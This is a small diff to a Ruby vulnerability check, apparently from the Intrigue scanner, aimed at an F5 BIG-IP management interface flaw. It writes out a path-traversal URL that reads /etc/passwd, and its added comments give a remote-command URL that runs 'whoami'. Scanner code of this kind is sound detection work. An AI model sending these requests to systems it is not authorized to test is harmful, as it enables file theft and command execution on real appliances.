@@ -23,8 +23,16 @@ module Intrigue
   
       require_enrichment
   
+  
+      ##
+      ## Abitrary file read
+      ##
       check_url = "#{_get_entity_name}/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd"
   
+      ###
+      ### RCE - https://<IP>/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=whoami
+      ###
+
       response = http_get_body(check_url)
 
       if response =~ /root:x:0:0/
